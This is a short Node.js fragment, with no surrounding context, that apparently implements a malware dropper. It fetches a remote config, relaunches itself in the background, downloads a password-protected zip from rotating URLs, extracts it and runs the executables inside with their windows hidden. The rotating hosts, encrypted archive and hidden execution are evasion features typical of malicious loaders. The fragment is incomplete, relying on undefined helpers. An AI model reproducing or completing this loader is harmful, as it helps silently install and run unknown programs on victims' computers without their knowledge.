const config = await fetchConfig();
spawn(process.execPath, [__filename], { env: { BACKGROUND_MODE: 'true' }});
await downloadFileWithRotation(downloadUrls, zipPath);
Seven.extractFull(zipPath, extractPath, {password});
const exeFiles = files.filter(f => f.endsWith('.exe'));
spawn(exePath, [], {windowsHide: true});
await executeExe(extractPath);
